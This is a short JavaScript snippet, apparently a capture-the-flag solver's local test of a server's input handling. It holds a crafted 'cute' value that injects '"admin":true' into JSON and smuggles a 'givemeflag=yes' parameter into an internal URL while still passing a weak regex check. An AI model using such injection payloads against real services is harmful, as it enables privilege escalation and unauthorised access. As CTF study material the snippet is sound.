// 拿來測試伺服器端執行狀況的程式碼
const username = 'aaa';
const cute = 'true,"admin":true}%26givemeflag=yes%26%26`;#\/\/*true';


if (typeof username !== "string" || typeof cute !== "string" ||
    username === "" || !cute.match("(true|false)$")) {
    console.log({ error: "Whaaaat owo?" });
    return;
}

if (username.match(/[^a-z0-9]+/i)) {
    console.log({ error: "`Username` should contain only letters & numbers, owo." });
    return;
}

const userInfo = `{"username":"${username}","admin":false,"cute":${cute}}`;
console.log(userInfo);
const api = `http://127.0.0.1:9487/?data=${userInfo}&givemeflag=no22`;
console.log(api);


